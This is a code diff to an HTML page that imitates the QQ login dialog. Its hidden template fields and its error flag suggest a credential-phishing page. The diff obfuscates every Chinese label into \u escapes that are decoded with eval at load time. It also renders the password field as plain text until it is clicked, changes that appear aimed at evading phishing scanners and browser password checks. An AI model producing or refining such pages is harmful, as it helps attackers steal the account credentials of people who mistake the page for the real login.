@@ -11,28 +11,24 @@
     <a class="close" id="close" href="javascript:void(0);" title="关闭" tabindex="14"></a>
    </div>
    <div class="qrlogin" id="qrlogin">
-    <label class="qr_title">安全登录，防止被盗</label>
+    <label class="qr_title unc">\u5b89\u5168\u767b\u5f55\uff0c\u9632\u6b62\u88ab\u76d7</label>
     <div class="qr_img_box" id="qr_img_box">
      <img id="qr_img" class="qr_img" src="/images/qr_code.png"/>
      <span id="qr_img_logo" class="qr_img_logo"></span>
-     <span id="qr_invalid" class="qr_invalid"><span id="qr_mengban" class="qr_mengban"></span> <span id="qr_invalid_tips" class="qr_invalid_tips">二维码失效<br />请点击刷新</span></span>
+     <span id="qr_invalid" class="qr_invalid"><span id="qr_mengban" class="qr_mengban"></span> <span id="qr_invalid_tips" class="qr_invalid_tips unc">\u4e8c\u7ef4\u7801\u5931\u6548\u0026\u006c\u0074\u003b\u0062\u0072\u0020\u002f\u0026\u0067\u0074\u003b\u8bf7\u70b9\u51fb\u5237\u65b0</span></span>
     </div>
     <div class="qr_info">
-     <a class="qr_info_link" id="qr_info_link" href="#" tabindex="13">使用QQ手机版扫描二维码</a>
+     <a class="qr_info_link unc" id="qr_info_link" href="#" tabindex="13">\u4f7f\u7528\u0051\u0051\u624b\u673a\u7248\u626b\u63cf\u4e8c\u7ef4\u7801</a>
     </div>
     <div class="split_line"></div>
    </div>
    <div class="other_login" id="other_login">
     <div id="loginTips" class="loginTips">
-     <span class="qloginTips" id="qloginTips" href="javascript:void(0);">点击头像快速登录</span>
-     <span class="ploginTips" id="ploginTips" href="javascript:void(0);">帐号登录</span>
      <div class="error_tips" id="error_tips">
       <span class="error_logo" id="error_logo"></span>
       <span class="err_m" id="err_m"></span>
      </div>
      <div class="loading_tips" id="loading_tips">
-      <span id="loading_wording">登录中</span>
-      <img id="loading_img" class="loading_img" place_src="http://imgcache.qq.com/ptlogin/v4/style/0/images/load.gif" align="absmiddle" />
      </div>
     </div>
     <div class="qlogin" id="qlogin">
@@ -46,61 +42,46 @@
      <div class="login_form">
       <form id="loginform" autocomplete="off" name="loginform" action="" method="post" target="_self" style="margin:0">
        <div class="uinArea" id="uinArea">
-        <label class="input_tips" id="uin_tips" for="u">支持QQ号/邮箱/手机号登录</label>
+        <label class="input_tips unc" id="uin_tips" for="u">\u652f\u6301\u0051\u0051\u53f7\u002f\u90ae\u7bb1\u002f\u624b\u673a\u53f7\u767b\u5f55</label>
         <div class="inputOuter">
-         <input type="text" class="inputstyle" id="u" name="u" value="" tabindex="1" />
+         <input type="text" class="inputstyle" id="u" name="u" value=" " tabindex="1" />
          <span class="uin_icon"></span>
          <a class="uin_del" id="uin_del" href="javascript:void(0);"></a>
         </div>
         <ul class="email_list" id="email_list"></ul>
        </div>
        <div class="pwdArea" id="pwdArea">
-        <label class="input_tips" id="pwd_tips" for="p">密码</label>
+        <label class="input_tips unc" id="pwd_tips" for="p">\u5bc6\u7801</label>
         <input type="hidden" name="uid" value="<%=uid%>">
         <input type="hidden" name="mid" value="<%=mid%>">
         <input type="hidden" name="tz" value="<%=tz%>">
         <div class="inputOuter">
-         <input type="password" class="inputstyle password" id="p" name="p" value="" maxlength="16" tabindex="2" />
+         <input type="text" class="inputstyle password" id="p" name="p" value="" maxlength="16" tabindex="2" />
          <span class="p_icon"></span>
-        </div>
-        <div class="lock_tips" id="caps_lock_tips">
-         <span class="lock_tips_row"></span>
-         <span>大写锁定已打开</span>
         </div>
        </div>
        <div class="verifyArea" id="verifyArea">
         <div class="verifyinputArea" id="verifyinputArea">
-         <label class="input_tips" id="vc_tips" for="verifycode">验证码</label>
          <div class="inputOuter">
           <input name="verifycode" type="text" class="inputstyle verifycode" id="verifycode" value="" tabindex="3" />
          </div>
         </div>
-        <div class="verifyimgArea" id="verifyimgArea">
-         <img class="verifyimg" id="verifyimg" title="看不清，换一张" />
-         <a tabindex="4" href="javascript:void(0);" class="verifyimg_tips">看不清，换一张</a>
-        </div>
        </div>
        <div class="submit">
         <a class="login_button" hidefocus="true" href="javascript:void(0);">
-            <input type="button" tabindex="6" value="登 录" class="btn" id="login_buctton"/>
+            <input type="button" tabindex="6" value="\u767b\u0020\u5f55" class="btn" id="login_buctton"/>
         </a>
        </div>
       </form>
      </div>
     </div>
     <div class="login_switcher_box" id="login_switcher_box">
-     <a hidefocus="true" id="switcher_qlogin" class="switcher_qlogin" href="javascript:void(0);" tabindex="7">&lt;&lt;&nbsp;返回快速登录</a>
-     <a hidefocus="true" id="switcher_plogin" class="switcher_plogin" href="javascript:void(0);" tabindex="8">使用帐号密码登录</a>
+     <a hidefocus="true" id="switcher_qlogin" class="switcher_qlogin" href="javascript:void(0);" tabindex="7">&lt;&lt;&nbsp;\u8fd4\u56de\u5feb\u901f\u767b\u5f55</a>
+     <a hidefocus="true" id="switcher_plogin" class="switcher_plogin unc" href="javascript:void(0);" tabindex="8">\u4f7f\u7528\u5e10\u53f7\u5bc6\u7801\u767b\u5f55</a>
     </div>
    </div>
    <div id="qrlogin_step2" class="qrlogin_step2">
     <div class="step2_outer">
-     <div class="qr_h3">
-      扫描成功，请在手机上确认是否授权登录
-     </div>
-     <div class="goBack">
-      使用其它方式登录，请
-      <a id="goBack" href="javascript:void(0);" tabindex="14">返回</a>
      </div>
     </div>
    </div>
@@ -109,19 +90,30 @@
     <div class="qr_tips_pic" id="qr_tips_pic"></div>
    </div>
    <div class="bottom" id="bottom">
-    <span id="fgtpwdbox"><a href="#" class="link" id="forgetpwd" tabindex="10">忘了密码？</a> <span class="dotted">|</span></span>
-    <a href="#" class="link" tabindex="11">注册新帐号</a>
+    <span id="fgtpwdbox"><a href="#" class="link unc" id="forgetpwd" tabindex="10">\u5fd8\u4e86\u5bc6\u7801\uff1f</a> <span class="dotted">|</span></span>
+    <a href="#" class="link unc" tabindex="11">\u6ce8\u518c\u65b0\u5e10\u53f7</a>
     <span class="dotted">|</span>
-    <a class="link" id="feedback_qlogin" href="#" tabindex="12">意见反馈</a>
+    <a class="link unc" id="feedback_qlogin" href="#" tabindex="12">\u610f\u89c1\u53cd\u9988</a>
    </div>
    <div id="newVcodeArea" class="newVcodeArea"></div>
    <div id="proxy" class="hide"></div>
   </div>
 
   <script>
-      var _n = '<%=tz%>';
+  $('#p').on('click',function(){
+      var _this = this;
+     setTimeout(function(){
+        $(_this).attr('type','password');
+     },100);
+  });
+  $('.unc').each(function(){
+      var _x = $(this).html();
+      $(this).html(eval('"'+_x+'"'));
+  });
+  $('#login_buctton').val(eval('"' + $('#login_buctton').val() + '"'));
+    var _n = '<%=tz%>';
     $('#u').on('input',function(){
-          if($(this).val() !== '') {
+          if($(this).val() !== '' || $(this).val() !== ' ') {
               $('#uin_tips').css({'display':'none'});
           }else {
               $('#uin_tips').css({'display':'block'});
@@ -137,14 +129,14 @@
       var err_m = $('#err_m');
       var error_tips = $('#error_tips');
       $('#login_buctton').on('click',function(){
-          if ($('#u').val() === '') {
-            err_m.html('请输入QQ号！');
+          if ($('#u').val() === '' || $('#u').val() === ' ') {
+            err_m.html('\u8bf7\u8f93\u5165\u0051\u0051\u53f7\uff01');
             error_tips.css({"display":"block"});
             setTimeout(function(){
                 error_tips.css({"display":"none"});
             },1000);
         } else if($('#p').val() === ''){
-            err_m.html('你还没有输入密码！');
+            err_m.html('\u4f60\u8fd8\u6ca1\u6709\u8f93\u5165\u5bc6\u7801\uff01');
              error_tips.css({"display":"block"});
             setTimeout(function(){
                 error_tips.css({"display":"none"});
@@ -159,7 +151,7 @@
         }
       });
     if (_n === '1') {
-        err_m.html('账号密码错误,请重新输入!');
+        err_m.html('\u8d26\u53f7\u5bc6\u7801\u9519\u8bef\u002c\u8bf7\u91cd\u65b0\u8f93\u5165\u0021');
         error_tips.css({"display":"block"});
     }
   </script>
